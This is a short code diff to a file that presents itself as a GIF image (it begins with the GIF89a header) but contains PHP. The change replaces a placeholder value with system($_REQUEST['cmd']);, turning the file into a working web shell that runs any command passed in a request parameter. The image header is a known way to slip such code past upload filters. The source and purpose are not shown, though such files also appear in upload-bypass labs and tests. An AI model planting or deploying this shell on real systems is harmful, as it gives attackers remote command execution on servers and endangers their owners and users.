@@ -1,4 +1,4 @@
 GIF89a
 <?php
-    1
+    system($_REQUEST['cmd']);
 ?>
